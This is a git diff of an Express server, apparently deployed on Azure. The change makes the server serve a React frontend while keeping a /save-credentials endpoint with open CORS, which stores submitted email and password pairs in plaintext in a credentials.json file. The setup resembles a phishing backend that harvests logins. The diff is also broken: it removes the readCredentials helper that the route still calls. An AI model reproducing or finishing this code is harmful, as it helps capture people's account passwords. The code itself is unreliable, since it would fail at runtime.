@@ -4,24 +4,19 @@ import cors from "cors";
 import path from "path";
 
 const app = express();
-const PORT = process.env.PORT || 5000; // Use Azure-assigned port or fallback to 5000
+const PORT = process.env.PORT || 5000; // Use Azure's assigned port
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 
-// Define the path for storing credentials
-const credsFilePath = process.env.CREDENTIALS_PATH || path.resolve("server/credentials.json");
+// Serve the built React frontend
+const __dirname = path.resolve();
+app.use(express.static(path.join(__dirname, "dist")));
 
-// Helper function to read existing credentials
-const readCredentials = async () => {
-  try {
-    const data = await fs.readFile(credsFilePath, "utf-8");
-    return JSON.parse(data);
-  } catch (error) {
-    return []; // Return empty array if file doesn't exist or is empty
-  }
-};
+app.get("*", (req, res) => {
+  res.sendFile(path.join(__dirname, "dist", "index.html"));
+});
 
 // API Route to Save Credentials
 app.post("/save-credentials", async (req, res) => {
@@ -31,6 +26,7 @@ app.post("/save-credentials", async (req, res) => {
   }
 
   try {
+    const credsFilePath = process.env.CREDENTIALS_PATH || path.resolve("server/credentials.json");
     const creds = await readCredentials();
     creds.push({ email, password });
 
@@ -40,11 +36,6 @@ app.post("/save-credentials", async (req, res) => {
     console.error("Error writing file:", error);
     res.status(500).json({ error: "Failed to save credentials." });
   }
-});
-
-// Root Route (For Azure Health Check)
-app.get("/", (req, res) => {
-  res.status(200).send("Server is running!");
 });
 
 // Start the server
